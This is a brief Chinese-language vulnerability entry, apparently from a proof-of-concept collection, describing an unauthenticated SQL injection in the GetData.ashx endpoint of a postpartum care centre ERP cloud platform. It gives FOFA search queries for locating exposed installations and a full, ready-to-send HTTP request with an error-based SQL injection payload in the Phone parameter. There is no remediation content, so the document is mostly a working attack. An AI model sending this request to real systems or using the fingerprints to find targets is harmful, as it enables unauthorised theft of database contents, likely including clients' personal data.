# 月子会所ERP管理云平台GetData.ashx存在SQL注入

月子会所ERP管理云平台 GetData.ashx 接口处存在SQL注入漏洞未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx"
```

## poc
```javascript
GET /Page/BasicInfo/ashx/GetData.ashx?ChannelId=&ClientName=1&FitemId=null&Phone=1{{urlescape(' AND 4798 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (4798=4798) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(98)+CHAR(113)))-- uTFu)}}&RequestMethod=ApplyActivity&SaleId= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![image-20241227222800031](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272228089.png)